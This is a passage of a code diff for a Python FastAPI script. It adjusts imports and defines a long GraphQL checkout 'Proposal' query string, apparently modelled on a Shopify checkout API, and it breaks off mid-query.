@@ -6,11 +6,8 @@ import re
 import random
 import argparse
 import concurrent.futures
-from curl_cffi.requests import AsyncSession as CffiSession
-from curl_cffi.requests.exceptions import Timeout as CffiTimeout, ProxyError as CffiProxyError
-from curl_cffi.requests.exceptions import ConnectionError as CffiConnectionError, CurlError as CffiCurlError
 from urllib.parse import urlparse
-from fastapi import FastAPI, Query, HTTPException
+from fastapi import FastAPI, Query, HTTPException, Request
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel
 from typing import List, Optional
@@ -18,6 +15,7 @@ import uvicorn
 import os
 import time
 import logging
+from curl_cffi.requests import AsyncSession
 
 QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on 